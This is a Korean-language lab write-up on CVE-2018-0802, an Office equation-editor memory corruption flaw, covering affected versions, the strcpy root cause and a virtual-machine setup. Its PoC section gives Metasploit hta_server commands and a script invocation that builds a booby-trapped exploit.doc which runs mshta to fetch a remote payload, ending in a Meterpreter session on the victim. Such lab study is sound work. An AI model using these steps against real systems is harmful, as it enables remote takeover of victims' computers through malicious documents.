# CVE-2018-0802 / Microsoft Memory Corruption Vulnerability
작성자 : Syno 

해당 취약점은 소프트웨어가 메모리의 개체를 제대로 처리하지 못하여 발생하는 메모리 손상 취약점이다.     
취약점이 성공적으로 악용되며 해당 공격자는 시스템을 제어할 수 있다.    
또한 공격자가 프로그램을 설치할 수 있으며 새로운 계정을 생성하거나 데이터를 보는 등 여러가지를 할 수 있다.

#### 취약점에 영향을 받는 버전
- MS office 2016
- MS office 2013
- MS office 2010
- MS office 2007

<hr>

참고 글

[[MS Office] 취약점 CVE-2018-0802](https://m.blog.naver.com/sunkwang0307/221382978088)     
[Microsoft Office 메모리 손상 취약점 (CVE-2018-0802)](https://two2sh.tistory.com/18)
[CVE-2018-0802 MS Office 취약점 실습 (Metasploit)](https://hackernextdoor.club/poc/2019/05/21/CVE-2018-0802.html)

<hr>

## 환경구축
- Windows 7     
- MS office 2010

1. [Windows 7 iso Download](https://tech-latest.com/download-windows-7-iso/) -> vmware -> windows 7 install     
2. MS office 2010 Download

<img width="1478" alt="Screen Shot 2022-02-09 at 4 17 21 AM" src="https://user-images.githubusercontent.com/84657474/153059467-b0e8314d-c852-481b-9483-b8a11c5e256e.png">

<hr>

## 발생 원인
CVE-2018-0802 취약점은 Office 문서에 수식을 삽인하고 편집을할 떄 사용하는 컴포터는 eqnedt32.exe에서 발생한다.     
eqnedt32.exe에서 폰트 레코드명을 처리하는 과정 중 원본과 대상 버퍼의 크기를 체크하지 않으며 공격에 취약한 strcpy()가 사용된다.

Microsoft에 2017년 11월 패치 이후에 ```SUB_41160F()``` 함수의 strcpy() 전후 버퍼 크기를 확인하는 코드가 추가되었지만, ```SUB_421E39()``` 함수에 대해서는 조치가 취해지지 않았다고 한다.


## PoC
<img width="1688" alt="Screen Shot 2022-02-08 at 4 33 25 AM" src="https://user-images.githubusercontent.com/84657474/152858809-05ecf149-9fc7-4d89-a30c-3503ea220307.png">

```use exploit/windows/misc/hta_server```     
#### - hta_server 모듈은 .hta 파일이 실행되고 파워쉘을 통해 공격자의 Payload를 실행시켜주는 해당 .hta 파일을 제공한다.


```set srvhost 172.16.46.129```    
#### - 활성화되어있는 로컬 주소를 적어야한다.


```exploit```   
#### - Exploit을 하면 공격 Payload가 삽입된 .hta 파일이 생성된다.


<img width="1688" alt="Screen Shot 2022-02-08 at 4 34 09 AM" src="https://user-images.githubusercontent.com/84657474/152858906-f5628fc7-566f-496a-9d64-f706470d3d6d.png">

```python2 RTF_11882_0802.py -c "mshta http://172.16.46.129:8080/gYQN4bZ.hta" -o exploit.doc```    
#### - 해당 Python코드를 이용해 -c 옵션을 통하여 Exploit을 수행해서 .hta파일을 입력하고, 출력되는 Office 파일의 이름을 -o 옵션에 적어준다.

<img width="1478" alt="Screen Shot 2022-02-09 at 4 21 15 AM" src="https://user-images.githubusercontent.com/84657474/153060036-8328c501-7354-44d6-8008-4216e92b75f5.png">

위사진과 같이 victim 컴퓨터에서 해당 주소로 접속을하게되면 위에서 만들었던 exploit.doc을 다운받을 수 있다.

<img width="1478" alt="Screen Shot 2022-02-09 at 4 21 52 AM" src="https://user-images.githubusercontent.com/84657474/153060145-92053136-3ef2-4913-a334-50a48540be51.png">

해당 exploit.doc 파일을 다운받고 실행을 시키면 위에 사진과 같이 평범하게 Microsoft Office를 통하여 열 수 있다.

<img width="1713" alt="Screen Shot 2022-02-09 at 4 22 16 AM" src="https://user-images.githubusercontent.com/84657474/153060196-8fbb5c37-bfa3-43e4-b299-331077cd93a7.png">

이 후 공격자에 컴퓨터에서 ```session -i``` 명령을 통하여 victim 컴퓨터와 연결이 되었는지를 알 수 있다.

<img width="1713" alt="Screen Shot 2022-02-09 at 4 23 00 AM" src="https://user-images.githubusercontent.com/84657474/153060323-d78422f8-9388-48bb-a61f-6d6c46c23bf1.png">

마지막으로 ```session -i 1``` 을 통하여 첫번째로 활성화된 세션과 연결을 맺는다.     
연결을 맺게되면 공격자는 미터프리터 세션에서 ```sysinfo``` 명령을 통하여 victim에 시스템 정보를 가져올 수 있게된다.
